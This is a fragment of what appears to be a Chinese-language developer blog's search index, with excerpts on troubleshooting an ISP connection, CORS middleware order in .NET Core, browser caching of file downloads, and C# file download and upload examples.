","date":"2023-03-31","objectID":"/blog/posts/%E6%8E%92%E6%9F%A5%E4%B8%AD%E8%8F%AF%E9%9B%BB%E4%BF%A1%E5%85%89%E4%B8%96%E4%BB%A3%E9%80%A3%E4%B8%8D%E5%88%B0%E7%89%B9%E5%AE%9A%E7%B6%B2%E7%AB%99%E5%95%8F%E9%A1%8C%E8%88%87%E5%A0%B1%E4%BF%AE%E6%96%B9%E5%BC%8F/:5:6","tags":["中華電信","光世代","網站連不到","任天堂連不到","中華電信報修"],"title":"排查中華電信光世代連不到特定網站問題與報修方式","uri":"/blog/posts/%E6%8E%92%E6%9F%A5%E4%B8%AD%E8%8F%AF%E9%9B%BB%E4%BF%A1%E5%85%89%E4%B8%96%E4%BB%A3%E9%80%A3%E4%B8%8D%E5%88%B0%E7%89%B9%E5%AE%9A%E7%B6%B2%E7%AB%99%E5%95%8F%E9%A1%8C%E8%88%87%E5%A0%B1%E4%BF%AE%E6%96%B9%E5%BC%8F/"},{"categories":["網路"],"content":"所以是不能解決我的 Source IP 嗎? 你們中華電信工程師無法解決??難道只有換 ISP 才能解決?! 能不能先幫我解決 Source IP 問題嗎? 為什麼我朋友中華電信浮動IP可以連，我就不行!!! —- 下面就傳了 MTR 設定，就不詳細貼上 —— 我這邊附上浮動和固定 IP MTR，這邊我朋友事後看說附上 IP 可能會比較好查。 這邊也有附上 Prometheus 監控給他們，我竟然把監控用在這上面，哀哀。😒 這邊這幾天先調整固定IP。 ","date":"2023-03-31","objectID":"/blog/posts/%E6%8E%92%E6%9F%A5%E4%B8%AD%E8%8F%AF%E9%9B%BB%E4%BF%A1%E5%85%89%E4%B8%96%E4%BB%A3%E9%80%A3%E4%B8%8D%E5%88%B0%E7%89%B9%E5%AE%9A%E7%B6%B2%E7%AB%99%E5%95%8F%E9%A1%8C%E8%88%87%E5%A0%B1%E4%BF%AE%E6%96%B9%E5%BC%8F/:6:0","tags":["中華電信","光世代","網站連不到","任天堂連不到","中華電信報修"],"title":"排查中華電信光世代連不到特定網站問題與報修方式","uri":"/blog/posts/%E6%8E%92%E6%9F%A5%E4%B8%AD%E8%8F%AF%E9%9B%BB%E4%BF%A1%E5%85%89%E4%B8%96%E4%BB%A3%E9%80%A3%E4%B8%8D%E5%88%B0%E7%89%B9%E5%AE%9A%E7%B6%B2%E7%AB%99%E5%95%8F%E9%A1%8C%E8%88%87%E5%A0%B1%E4%BF%AE%E6%96%B9%E5%BC%8F/"},{"categories":["網路"],"content":"最後回覆 X天後我收到中華電信客服回覆，說我的網路訊號到國外網站正常，這邊打臉之前說到海纜障礙影響當下路由阻塞😒，不知道是哪邊設定影響到我這個問題，反正最後來回多次終於修好了。我之後寫文章貼圖不會再遇到鳥問題(不能上傳圖片)。 ","date":"2023-03-31","objectID":"/blog/posts/%E6%8E%92%E6%9F%A5%E4%B8%AD%E8%8F%AF%E9%9B%BB%E4%BF%A1%E5%85%89%E4%B8%96%E4%BB%A3%E9%80%A3%E4%B8%8D%E5%88%B0%E7%89%B9%E5%AE%9A%E7%B6%B2%E7%AB%99%E5%95%8F%E9%A1%8C%E8%88%87%E5%A0%B1%E4%BF%AE%E6%96%B9%E5%BC%8F/:6:1","tags":["中華電信","光世代","網站連不到","任天堂連不到","中華電信報修"],"title":"排查中華電信光世代連不到特定網站問題與報修方式","uri":"/blog/posts/%E6%8E%92%E6%9F%A5%E4%B8%AD%E8%8F%AF%E9%9B%BB%E4%BF%A1%E5%85%89%E4%B8%96%E4%BB%A3%E9%80%A3%E4%B8%8D%E5%88%B0%E7%89%B9%E5%AE%9A%E7%B6%B2%E7%AB%99%E5%95%8F%E9%A1%8C%E8%88%87%E5%A0%B1%E4%BF%AE%E6%96%B9%E5%BC%8F/"},{"categories":["網路"],"content":"相關問題文章 想知道從自己電腦連到目標主機連線 – 嚇嚇叫 [問題] Hinet浮動IP前兩組數字不會變 - 看板 Broad_Band - 批踢踢實業坊 (79) 中華電信 BRAS 225X 掐速測試 - YouTube Hinet 500M BRAS 掐速!!! 有一樣的網友一起回報吧!! - Mobile01 【情報】關於從昨天早上就連不上線的問題 @戰地風雲 哈啦板 - 巴哈姆特 【問題】網路掉封包問題 @電腦應用綜合討論 哈啦板 - 巴哈姆特 【問題】如何確定電腦至遊戲server端網路狀態 @戰車世界 World of Tanks 哈啦板 - 巴哈姆特 [問題] 每到特定時間只有switch無法連上網路 - 看板 NSwitch - 批踢踢實業坊 [問題] Switch連上熱點卻沒有連上網路 - nswitch | PTT遊戲區 雷神講堂 | 聽說海纜船要等到 4 月才能作業… | Facebook 【心得】中華電信回應看Twitch實況Lag問題。(附影片) @英雄聯盟 League of Legends 哈啦板 - 巴哈姆特 有沒有人使用中華電信線路的 ","date":"2023-03-31","objectID":"/blog/posts/%E6%8E%92%E6%9F%A5%E4%B8%AD%E8%8F%AF%E9%9B%BB%E4%BF%A1%E5%85%89%E4%B8%96%E4%BB%A3%E9%80%A3%E4%B8%8D%E5%88%B0%E7%89%B9%E5%AE%9A%E7%B6%B2%E7%AB%99%E5%95%8F%E9%A1%8C%E8%88%87%E5%A0%B1%E4%BF%AE%E6%96%B9%E5%BC%8F/:7:0","tags":["中華電信","光世代","網站連不到","任天堂連不到","中華電信報修"],"title":"排查中華電信光世代連不到特定網站問題與報修方式","uri":"/blog/posts/%E6%8E%92%E6%9F%A5%E4%B8%AD%E8%8F%AF%E9%9B%BB%E4%BF%A1%E5%85%89%E4%B8%96%E4%BB%A3%E9%80%A3%E4%B8%8D%E5%88%B0%E7%89%B9%E5%AE%9A%E7%B6%B2%E7%AB%99%E5%95%8F%E9%A1%8C%E8%88%87%E5%A0%B1%E4%BF%AE%E6%96%B9%E5%BC%8F/"},{"categories":["網路"],"content":"MTR 紀錄 我後來用 Prometheus 監控如下。 foobar2000.org AWS 最後在寫這篇聽到最近鄰居也換第四台網路，這邊之後也會考慮看看。 ","date":"2023-03-31","objectID":"/blog/posts/%E6%8E%92%E6%9F%A5%E4%B8%AD%E8%8F%AF%E9%9B%BB%E4%BF%A1%E5%85%89%E4%B8%96%E4%BB%A3%E9%80%A3%E4%B8%8D%E5%88%B0%E7%89%B9%E5%AE%9A%E7%B6%B2%E7%AB%99%E5%95%8F%E9%A1%8C%E8%88%87%E5%A0%B1%E4%BF%AE%E6%96%B9%E5%BC%8F/:8:0","tags":["中華電信","光世代","網站連不到","任天堂連不到","中華電信報修"],"title":"排查中華電信光世代連不到特定網站問題與報修方式","uri":"/blog/posts/%E6%8E%92%E6%9F%A5%E4%B8%AD%E8%8F%AF%E9%9B%BB%E4%BF%A1%E5%85%89%E4%B8%96%E4%BB%A3%E9%80%A3%E4%B8%8D%E5%88%B0%E7%89%B9%E5%AE%9A%E7%B6%B2%E7%AB%99%E5%95%8F%E9%A1%8C%E8%88%87%E5%A0%B1%E4%BF%AE%E6%96%B9%E5%BC%8F/"},{"categories":[".Net Core"],"content":"Http Status Code 401 前端 axios status 抓到狀態是 0 是怎麼一回事? ","date":"2023-02-28","objectID":"/blog/posts/Net-Core-%E8%A8%AD%E5%AE%9A-Middleware-%E5%BC%95%E7%99%BC%E5%89%8D%E7%AB%AF%E9%8C%AF%E8%AA%A4%E5%95%8F%E9%A1%8C/:0:0","tags":[".netcore"],"title":".Net Core 設定 Middleware 引發前端錯誤問題","uri":"/blog/posts/Net-Core-%E8%A8%AD%E5%AE%9A-Middleware-%E5%BC%95%E7%99%BC%E5%89%8D%E7%AB%AF%E9%8C%AF%E8%AA%A4%E5%95%8F%E9%A1%8C/"},{"categories":[".Net Core"],"content":"問題 由於前端說我回錯誤沒有抓到 HTTP Status Code，說他的 axios 抓到 status 都為 0。但是我看開發著工具有顯示 status 為 0。這到底是什麼事情?(剛好農曆七月遇到鬼事) 後來改用 fetch 原生語法發生下面錯誤。和相關 NetWorkErr 錯誤。 ","date":"2023-02-28","objectID":"/blog/posts/Net-Core-%E8%A8%AD%E5%AE%9A-Middleware-%E5%BC%95%E7%99%BC%E5%89%8D%E7%AB%AF%E9%8C%AF%E8%AA%A4%E5%95%8F%E9%A1%8C/:1:0","tags":[".netcore"],"title":".Net Core 設定 Middleware 引發前端錯誤問題","uri":"/blog/posts/Net-Core-%E8%A8%AD%E5%AE%9A-Middleware-%E5%BC%95%E7%99%BC%E5%89%8D%E7%AB%AF%E9%8C%AF%E8%AA%A4%E5%95%8F%E9%A1%8C/"},{"categories":[".Net Core"],"content":"沒設定到 CORS 我看大多數文章說沒有設定 Access-Control-Allow-Origin: * 所造成的問題。所以 Network 401 但因為沒有 Access-Control-Allow-Origin: *，所以沒有錯誤。axios 沒寫出錯誤可能是 try catch 處理掉，所以沒什麼資訊。 status 才會得到是 0。 ","date":"2023-02-28","objectID":"/blog/posts/Net-Core-%E8%A8%AD%E5%AE%9A-Middleware-%E5%BC%95%E7%99%BC%E5%89%8D%E7%AB%AF%E9%8C%AF%E8%AA%A4%E5%95%8F%E9%A1%8C/:2:0","tags":[".netcore"],"title":".Net Core 設定 Middleware 引發前端錯誤問題","uri":"/blog/posts/Net-Core-%E8%A8%AD%E5%AE%9A-Middleware-%E5%BC%95%E7%99%BC%E5%89%8D%E7%AB%AF%E9%8C%AF%E8%AA%A4%E5%95%8F%E9%A1%8C/"},{"categories":[".Net Core"],"content":"我有設定 CORS 阿 但我 .Net Core 有設定這個。只發生錯誤時候不會傳Access-Control-Allow-Origin: * app.UseAuthentication(); app.UseAuthorization(); app.UseCors(); ","date":"2023-02-28","objectID":"/blog/posts/Net-Core-%E8%A8%AD%E5%AE%9A-Middleware-%E5%BC%95%E7%99%BC%E5%89%8D%E7%AB%AF%E9%8C%AF%E8%AA%A4%E5%95%8F%E9%A1%8C/:3:0","tags":[".netcore"],"title":".Net Core 設定 Middleware 引發前端錯誤問題","uri":"/blog/posts/Net-Core-%E8%A8%AD%E5%AE%9A-Middleware-%E5%BC%95%E7%99%BC%E5%89%8D%E7%AB%AF%E9%8C%AF%E8%AA%A4%E5%95%8F%E9%A1%8C/"},{"categories":[".Net Core"],"content":"順序 詳細可以看[Day03] Middleware- 我與 ASP.NET Core 3 的 30天 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 CORS 需要放在 authentication 上面，這樣可以解決上面那個問題。之前一直在想順序錯了會發生什麼，但經過這件事情，我大概想得出來是什麼原因造成的。CORS在後面的話，Authentication MiddleWare 驗證使用者不過會回傳，當下CORS MiddleWare 就不會經過。所以這一點需要特別注意！ ","date":"2023-02-28","objectID":"/blog/posts/Net-Core-%E8%A8%AD%E5%AE%9A-Middleware-%E5%BC%95%E7%99%BC%E5%89%8D%E7%AB%AF%E9%8C%AF%E8%AA%A4%E5%95%8F%E9%A1%8C/:4:0","tags":[".netcore"],"title":".Net Core 設定 Middleware 引發前端錯誤問題","uri":"/blog/posts/Net-Core-%E8%A8%AD%E5%AE%9A-Middleware-%E5%BC%95%E7%99%BC%E5%89%8D%E7%AB%AF%E9%8C%AF%E8%AA%A4%E5%95%8F%E9%A1%8C/"},{"categories":["程式心法"],"content":"遇到問題 最近用 .NET Core 做動態依照資料庫使用者會帶過來參數去尋找檔案路徑做回傳下載。下載檔案都是舊版本。我看Console 的 Network 都是 200。也沒有看到 204 抓Cache 的結果。這到底是為什麼呢?今天遇到我覺得要把這個問題找到。 這邊說這麼詳細是怕有各種情境有可能就會有不一樣結果。 ","date":"2023-02-20","objectID":"/blog/posts/%E6%AA%94%E6%A1%88%E4%B8%8B%E8%BC%89%E4%B8%80%E7%9B%B4%E6%8A%93%E5%88%B0%E8%88%8A%E6%AA%94%E6%A1%88%E7%9A%84%E5%95%8F%E9%A1%8C/:1:0","tags":[".netcore","cache","http","etag"],"title":"檔案下載一直抓到舊檔案的問題","uri":"/blog/posts/%E6%AA%94%E6%A1%88%E4%B8%8B%E8%BC%89%E4%B8%80%E7%9B%B4%E6%8A%93%E5%88%B0%E8%88%8A%E6%AA%94%E6%A1%88%E7%9A%84%E5%95%8F%E9%A1%8C/"},{"categories":["程式心法"],"content":"簡單實驗 後來抓到檔案因為我們沒有設定Cache-Control，然後動態下載檔案他的Last-Modified是當下時間可能是檔案異動時間。這邊雖然我沒給Last-Modified，是程式內部機制給的時間，雖然好像可以設定Last-Modified，但我發現再次跑檔案根本沒有進 Server 取檔案。仔細看Console 顯示200 磁碟快取，我覺得一定有什麼關係取到快取。雖然網路上很多交用Cache-Control: no-cache或 max-age=xxx，但我覺得要了解為什麼比較重要。 這邊用小遊戲下載網隨便一個檔案來Demo 第一次跑 第二次跑 我找到這篇http - What happens if you don’t set cache-control header? - Webmasters Stack Exchange。 裡面提到Chrome 至少 Cache 一個禮拜和(current time - last modified time) / 10兩者最小值。Firefox 規則又不太一樣。每一家實作不一樣，真的不好找阿… 我觀察Github Release 下載檔案做的事情，他下載是有做Cache-Control: no-cache，不過我視覺的能不能設定個60秒之類的會比不會比較好，減少 Server Loading。 ","date":"2023-02-20","objectID":"/blog/posts/%E6%AA%94%E6%A1%88%E4%B8%8B%E8%BC%89%E4%B8%80%E7%9B%B4%E6%8A%93%E5%88%B0%E8%88%8A%E6%AA%94%E6%A1%88%E7%9A%84%E5%95%8F%E9%A1%8C/:2:0","tags":[".netcore","cache","http","etag"],"title":"檔案下載一直抓到舊檔案的問題","uri":"/blog/posts/%E6%AA%94%E6%A1%88%E4%B8%8B%E8%BC%89%E4%B8%80%E7%9B%B4%E6%8A%93%E5%88%B0%E8%88%8A%E6%AA%94%E6%A1%88%E7%9A%84%E5%95%8F%E9%A1%8C/"},{"categories":["程式心法"],"content":"找到問題 沒有副檔名的時候不會發送If-Modified-Since。上面測小遊戲下載網隨便一個檔案來Demo的exe檔案，請求(Request)竟然不會帶到這個header If-Modified-Since 。不過我這邊放在hfs上面，發現能抓到cache。但把test7z(沒有副檔名)放在hfs下載，兩次下載都會吃到Cache。 所以我推知之前用程式指向路徑做下載，應該是採到 URL 沒有副檔名關係，所以都會吃到Cache。所以程式做這些事情可能要留意一下這個問題。 第一次 第二次 ","date":"2023-02-20","objectID":"/blog/posts/%E6%AA%94%E6%A1%88%E4%B8%8B%E8%BC%89%E4%B8%80%E7%9B%B4%E6%8A%93%E5%88%B0%E8%88%8A%E6%AA%94%E6%A1%88%E7%9A%84%E5%95%8F%E9%A1%8C/:3:0","tags":[".netcore","cache","http","etag"],"title":"檔案下載一直抓到舊檔案的問題","uri":"/blog/posts/%E6%AA%94%E6%A1%88%E4%B8%8B%E8%BC%89%E4%B8%80%E7%9B%B4%E6%8A%93%E5%88%B0%E8%88%8A%E6%AA%94%E6%A1%88%E7%9A%84%E5%95%8F%E9%A1%8C/"},{"categories":["程式心法"],"content":"簡單說重點 我發現當沒有 Cache-Control 時候瀏覽器還是會做緩存，預設為(current time - last modified time) / 10，但這部分是找到相關資料，所以沒有什麼動作就會有緩存動作。這讓我想到以前做後端回傳報表資料都會有緩存問題，但有可能是這個問題。但這個緩存問題有時很複雜，有可能是 Server 吃住 Cache 導致，有可能要重啟服務才能跑。 ","date":"2023-02-20","objectID":"/blog/posts/%E6%AA%94%E6%A1%88%E4%B8%8B%E8%BC%89%E4%B8%80%E7%9B%B4%E6%8A%93%E5%88%B0%E8%88%8A%E6%AA%94%E6%A1%88%E7%9A%84%E5%95%8F%E9%A1%8C/:3:1","tags":[".netcore","cache","http","etag"],"title":"檔案下載一直抓到舊檔案的問題","uri":"/blog/posts/%E6%AA%94%E6%A1%88%E4%B8%8B%E8%BC%89%E4%B8%80%E7%9B%B4%E6%8A%93%E5%88%B0%E8%88%8A%E6%AA%94%E6%A1%88%E7%9A%84%E5%95%8F%E9%A1%8C/"},{"categories":["程式心法"],"content":"解決方法 程式指向檔案最好加上Cache-Control: no-cache 或max-age就好。這邊我選擇的是控制max-age。至少有一分鐘緩存，User一直狂點連結那一小時都是緩存的。 ","date":"2023-02-20","objectID":"/blog/posts/%E6%AA%94%E6%A1%88%E4%B8%8B%E8%BC%89%E4%B8%80%E7%9B%B4%E6%8A%93%E5%88%B0%E8%88%8A%E6%AA%94%E6%A1%88%E7%9A%84%E5%95%8F%E9%A1%8C/:4:0","tags":[".netcore","cache","http","etag"],"title":"檔案下載一直抓到舊檔案的問題","uri":"/blog/posts/%E6%AA%94%E6%A1%88%E4%B8%8B%E8%BC%89%E4%B8%80%E7%9B%B4%E6%8A%93%E5%88%B0%E8%88%8A%E6%AA%94%E6%A1%88%E7%9A%84%E5%95%8F%E9%A1%8C/"},{"categories":["程式心法"],"content":".Net Core 這邊留 .Net Core 解決方法。 ASP.NET Core 中的回應快取 | Microsoft Docs [HttpGet] [ResponseCache(Duration = 60)] public IActionResult Get([FromQuery] RequestDto request) { string filePath = \"/sss/ssss/ffff.mp4\"; if (string.IsNullOrEmpty(filePath)) { return NotFound(); } string fileName = Path.GetFileName(filePath); new FileExtensionContentTypeProvider().TryGetContentType(fileName, out string contentType); contentType ??= \"application/octet-stream\"; return PhysicalFile(filePath, contentType, fileDownloadName: fileName, enableRangeProcessing: true); } 19.研究OutputCache、ResponseCache兩快取差異 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 ","date":"2023-02-20","objectID":"/blog/posts/%E6%AA%94%E6%A1%88%E4%B8%8B%E8%BC%89%E4%B8%80%E7%9B%B4%E6%8A%93%E5%88%B0%E8%88%8A%E6%AA%94%E6%A1%88%E7%9A%84%E5%95%8F%E9%A1%8C/:4:1","tags":[".netcore","cache","http","etag"],"title":"檔案下載一直抓到舊檔案的問題","uri":"/blog/posts/%E6%AA%94%E6%A1%88%E4%B8%8B%E8%BC%89%E4%B8%80%E7%9B%B4%E6%8A%93%E5%88%B0%E8%88%8A%E6%AA%94%E6%A1%88%E7%9A%84%E5%95%8F%E9%A1%8C/"},{"categories":["程式心法"],"content":"Spring Boot java - How to enable HTTP response caching in Spring Boot - Stack Overflow Cache Headers in Spring MVC | Baeldung ","date":"2023-02-20","objectID":"/blog/posts/%E6%AA%94%E6%A1%88%E4%B8%8B%E8%BC%89%E4%B8%80%E7%9B%B4%E6%8A%93%E5%88%B0%E8%88%8A%E6%AA%94%E6%A1%88%E7%9A%84%E5%95%8F%E9%A1%8C/:4:2","tags":[".netcore","cache","http","etag"],"title":"檔案下載一直抓到舊檔案的問題","uri":"/blog/posts/%E6%AA%94%E6%A1%88%E4%B8%8B%E8%BC%89%E4%B8%80%E7%9B%B4%E6%8A%93%E5%88%B0%E8%88%8A%E6%AA%94%E6%A1%88%E7%9A%84%E5%95%8F%E9%A1%8C/"},{"categories":["程式心法"],"content":"Laravel php - Laravel 5 how to set Cache-Control HTTP header globally? - Stack Overflow Laravel 中间件 SetCacheHeaders (etag/no-cache/max-age) | Laravel优质外文翻译 | Laravel China 社区 ","date":"2023-02-20","objectID":"/blog/posts/%E6%AA%94%E6%A1%88%E4%B8%8B%E8%BC%89%E4%B8%80%E7%9B%B4%E6%8A%93%E5%88%B0%E8%88%8A%E6%AA%94%E6%A1%88%E7%9A%84%E5%95%8F%E9%A1%8C/:4:3","tags":[".netcore","cache","http","etag"],"title":"檔案下載一直抓到舊檔案的問題","uri":"/blog/posts/%E6%AA%94%E6%A1%88%E4%B8%8B%E8%BC%89%E4%B8%80%E7%9B%B4%E6%8A%93%E5%88%B0%E8%88%8A%E6%AA%94%E6%A1%88%E7%9A%84%E5%95%8F%E9%A1%8C/"},{"categories":["程式心法"],"content":"文章 緩存還有很多東西還沒，有分舊版和新版，甚至瀏覽器重新整理會帶的 Request也會不一樣。 使用 HTTP 缓存：Etag, Last-Modified 与 Cache-Control | Harttle Land 備份圖 从未如此简单：5分钟搞懂 HTTP 缓存机制-51CTO.COM ","date":"2023-02-20","objectID":"/blog/posts/%E6%AA%94%E6%A1%88%E4%B8%8B%E8%BC%89%E4%B8%80%E7%9B%B4%E6%8A%93%E5%88%B0%E8%88%8A%E6%AA%94%E6%A1%88%E7%9A%84%E5%95%8F%E9%A1%8C/:5:0","tags":[".netcore","cache","http","etag"],"title":"檔案下載一直抓到舊檔案的問題","uri":"/blog/posts/%E6%AA%94%E6%A1%88%E4%B8%8B%E8%BC%89%E4%B8%80%E7%9B%B4%E6%8A%93%E5%88%B0%E8%88%8A%E6%AA%94%E6%A1%88%E7%9A%84%E5%95%8F%E9%A1%8C/"},{"categories":["程式心法"],"content":"其他參考 caching - What’s default value of cache-control? - Stack Overflow ","date":"2023-02-20","objectID":"/blog/posts/%E6%AA%94%E6%A1%88%E4%B8%8B%E8%BC%89%E4%B8%80%E7%9B%B4%E6%8A%93%E5%88%B0%E8%88%8A%E6%AA%94%E6%A1%88%E7%9A%84%E5%95%8F%E9%A1%8C/:6:0","tags":[".netcore","cache","http","etag"],"title":"檔案下載一直抓到舊檔案的問題","uri":"/blog/posts/%E6%AA%94%E6%A1%88%E4%B8%8B%E8%BC%89%E4%B8%80%E7%9B%B4%E6%8A%93%E5%88%B0%E8%88%8A%E6%AA%94%E6%A1%88%E7%9A%84%E5%95%8F%E9%A1%8C/"},{"categories":["程式心法"],"content":"彩蛋 金流自己串，使用 Node.js 串接 LINE Pay ","date":"2023-02-20","objectID":"/blog/posts/%E6%AA%94%E6%A1%88%E4%B8%8B%E8%BC%89%E4%B8%80%E7%9B%B4%E6%8A%93%E5%88%B0%E8%88%8A%E6%AA%94%E6%A1%88%E7%9A%84%E5%95%8F%E9%A1%8C/:7:0","tags":[".netcore","cache","http","etag"],"title":"檔案下載一直抓到舊檔案的問題","uri":"/blog/posts/%E6%AA%94%E6%A1%88%E4%B8%8B%E8%BC%89%E4%B8%80%E7%9B%B4%E6%8A%93%E5%88%B0%E8%88%8A%E6%AA%94%E6%A1%88%E7%9A%84%E5%95%8F%E9%A1%8C/"},{"categories":[".Net Core"],"content":"提到網頁功能一定會有下載檔案/上傳檔案需求，這邊整理會用到方法與遇到上傳檔案問題。 ","date":"2023-02-20","objectID":"/blog/posts/Net-Core-Controller-%E4%B8%8B%E8%BC%89%E6%AA%94%E6%A1%88-%E4%B8%8A%E5%82%B3%E6%AA%94%E6%A1%88/:0:0","tags":[".netcore","upload","download"],"title":".Net Core Controller 下載檔案/上傳檔案","uri":"/blog/posts/Net-Core-Controller-%E4%B8%8B%E8%BC%89%E6%AA%94%E6%A1%88-%E4%B8%8A%E5%82%B3%E6%AA%94%E6%A1%88/"},{"categories":[".Net Core"],"content":"下載檔案 public IActionResult Get([FromQuery] GetFileDownloadRequest request) { FileTypeEnum fileType = request.ReqFileType; string filePath = \"\"; ... getFilePath if (string.IsNullOrEmpty(filePath)) { return NotFound(); } string fileName = Path.GetFileName(filePath); return PhysicalFile(filePath, \"application/octet-stream\",fileDownloadName: fileName); } ","date":"2023-02-20","objectID":"/blog/posts/Net-Core-Controller-%E4%B8%8B%E8%BC%89%E6%AA%94%E6%A1%88-%E4%B8%8A%E5%82%B3%E6%AA%94%E6%A1%88/:1:0","tags":[".netcore","upload","download"],"title":".Net Core Controller 下載檔案/上傳檔案","uri":"/blog/posts/Net-Core-Controller-%E4%B8%8B%E8%BC%89%E6%AA%94%E6%A1%88-%E4%B8%8A%E5%82%B3%E6%AA%94%E6%A1%88/"},{"categories":[".Net Core"],"content":"下載依照 Content-Type 設定metadata [HttpGet(\"[action]\")] public async Task\u003cIActionResult\u003e GetFile(string id) { var dir = \"GetOrBuildYourDirectoryString\"; var fileName = \"GetYourFileName\"; var mimeType = GetMimeType(fileName); var path = Path.Combine(dir, fileName); return PhysicalFile(path, mimeType, version.FileName); } public string GetMimeType(string fileName) { var provider = new FileExtensionContentTypeProvider(); string contentType; if (!provider.TryGetContentType(fileName, out contentType)) { contentType = \"application/octet-stream\"; } return contentType; } 參考:在TypeScript和ASP.NET Core中处理文件上传和受保护的下载_寒冰屋的博客-CSDN博客 ","date":"2023-02-20","objectID":"/blog/posts/Net-Core-Controller-%E4%B8%8B%E8%BC%89%E6%AA%94%E6%A1%88-%E4%B8%8A%E5%82%B3%E6%AA%94%E6%A1%88/:1:1","tags":[".netcore","upload","download"],"title":".Net Core Controller 下載檔案/上傳檔案","uri":"/blog/posts/Net-Core-Controller-%E4%B8%8B%E8%BC%89%E6%AA%94%E6%A1%88-%E4%B8%8A%E5%82%B3%E6%AA%94%E6%A1%88/"},{"categories":[".Net Core"],"content":"可接續下載方法 [HttpGet(\"[action]\")] public async Task\u003cIActionResult\u003e GetFile(string id) { string filePath = \"xxx\"; string fileName = Path.GetFileName(filePath); new FileExtensionContentTypeProvider().TryGetContentType(fileName, out string contentType); contentType ??= \"application/octet-stream\"; return PhysicalFile(filePath, contentType, fileDownloadName: fileName, enableRangeProcessing: true); } 主要是 enableRangeProcessing 設定為 true 就能做到，想當初 PHP 實作這個方法看到吐。 相關別的程式作法: PHP 實作支援 http 續傳功能及如何進行測試 | GD’s blog set content range in spring - Stack Overflow 【SpringMVC（十五）】HttpRange 分片下载 断点续传_绝世好阿狸的博客-CSDN博客_spring http range How to support HTTP Byte Serving in file streams? | Laravel.io ","date":"2023-02-20","objectID":"/blog/posts/Net-Core-Controller-%E4%B8%8B%E8%BC%89%E6%AA%94%E6%A1%88-%E4%B8%8A%E5%82%B3%E6%AA%94%E6%A1%88/:1:2","tags":[".netcore","upload","download"],"title":".Net Core Controller 下載檔案/上傳檔案","uri":"/blog/posts/Net-Core-Controller-%E4%B8%8B%E8%BC%89%E6%AA%94%E6%A1%88-%E4%B8%8A%E5%82%B3%E6%AA%94%E6%A1%88/"},{"categories":[".Net Core"],"content":"參考 認識 ASP․NET Core 檔案提供者與透過 Web API 下載實體檔案 | The Will Will Web 由ASP.NET Core根据路径下载文件异常引发的探究 - yi念之间 - 博客园 備份圖 asp.net core的文件读写 - 喵星人聚居地 ControllerBase.PhysicalFile 方法 (Microsoft.AspNetCore.Mvc) | Microsoft Docs FileResult In ASP.NET Core MVC - PanPan003 - 博客园 ASP.NET Core 中的檔案提供者 | Microsoft Docs .Net 如何修改 HttpHeaders 中的 Content-Disposition | 不挂高数 解决 Asp.Net5 在视频文件下载预览时无法快进的问题 | 不挂高数 ","date":"2023-02-20","objectID":"/blog/posts/Net-Core-Controller-%E4%B8%8B%E8%BC%89%E6%AA%94%E6%A1%88-%E4%B8%8A%E5%82%B3%E6%AA%94%E6%A1%88/:1:3","tags":[".netcore","upload","download"],"title":".Net Core Controller 下載檔案/上傳檔案","uri":"/blog/posts/Net-Core-Controller-%E4%B8%8B%E8%BC%89%E6%AA%94%E6%A1%88-%E4%B8%8A%E5%82%B3%E6%AA%94%E6%A1%88/"},{"categories":[".Net Core"],"content":"上傳檔案 推薦看下官方文件，裡面有滿多東西 推薦看下官方文件，裡面有滿多東西 推薦看下官方文件，裡面有滿多東西 在 ASP.NET Core 中上傳檔案 | Microsoft Docs 這邊先紀錄單純上傳方法，可能沒官方有做一些嚴謹判斷，有空再來開一篇記錄。(有空的話😜) // 自行注入 private readonly IConfiguration _configuration; private readonly IWebHostEnvironment _env; [HttpPost] [Route(\"[controller]\")] public IActionResult Post([FromForm]Request request){ ... UploadFile(...,request.UploadFile); ... } private void UploadFile(string paramPathName, IFormFile uploadFile) { string filepath = ProcessUploadedFile(paramPathName, \"paramFileTypePath\", uploadFile); ... } private string ProcessUploadedFile(string paramPathName, string directory,IFormFile formFile) { string uniqueFileName = null; if (string.IsNullOrWhiteSpace(_env.WebRootPath)) { _env.WebRootPath = System.IO.Path.Combine(Directory.GetCurrentDirectory(), \"wwwroot\"); } string datePath = DateTime.Now.ToString(\"yyyyMMdd\"); string rootPath = _configuration[\"UploadFilePath\"] ?? _env.WebRootPath; string uploadsFolder = Path.Combine(rootPath, \"upload\", paramPathName, directory, datePath); if (formFile != null) { Directory.CreateDirectory(uploadsFolder); uniqueFileName = Guid.NewGuid().ToString() + \"_\" + formFile.FileName; string filePath = Path.Combine(uploadsFolder, uniqueFileName); using var fileStream = new FileStream(filePath, FileMode.Create); formFile.CopyTo(fileStream); } return Path.Combine(uploadsFolder, uniqueFileName); } } ","date":"2023-02-20","objectID":"/blog/posts/Net-Core-Controller-%E4%B8%8B%E8%BC%89%E6%AA%94%E6%A1%88-%E4%B8%8A%E5%82%B3%E6%AA%94%E6%A1%88/:2:0","tags":[".netcore","upload","download"],"title":".Net Core Controller 下載檔案/上傳檔案","uri":"/blog/posts/Net-Core-Controller-%E4%B8%8B%E8%BC%89%E6%AA%94%E6%A1%88-%E4%B8%8A%E5%82%B3%E6%AA%94%E6%A1%88/"},{"categories":[".Net Core"],"content":"上傳限制調整 主要參考這兩個網站整理資訊。 ASPNetCore上传大文件碰到的一些问题总结 - 簡書 如何在ASP.NET Core中上传超大文件 - 心如止水，波澜不惊 - 博客园 ","date":"2023-02-20","objectID":"/blog/posts/Net-Core-Controller-%E4%B8%8B%E8%BC%89%E6%AA%94%E6%A1%88-%E4%B8%8A%E5%82%B3%E6%AA%94%E6%A1%88/:2:1","tags":[".netcore","upload","download"],"title":".Net Core Controller 下載檔案/上傳檔案","uri":"/blog/posts/Net-Core-Controller-%E4%B8%8B%E8%BC%89%E6%AA%94%E6%A1%88-%E4%B8%8A%E5%82%B3%E6%AA%94%E6%A1%88/"},{"categories":[".Net Core"],"content":"設定 IIS 上傳限制 IIS 的 web.config 設定 \u003c!--//上传文件大小限制IIS设置 256M --\u003e \u003csystem.webServer\u003e \u003csecurity\u003e \u003crequestFiltering\u003e \u003crequestLimits maxAllowedContentLength=\"268435456\" /\u003e \u003c/requestFiltering\u003e \u003c/security\u003e \u003c/system.webServer\u003e 這段程式碼的關鍵：requestLimits maxAllowedContentLength=“209715200” 。這句話的意思就是把允許上傳的最大檔案設定為256M。這個值，你們可以根據自己項目的需要實際設定。這裡，我們先暫時設定成256M。 這邊要我們用算的可能很不方便，我這邊有找到這個網站可以算出。 數字換算,單位換算,單位轉換 奇怪怎麼沒有找到前端版本 這邊 Kestrel 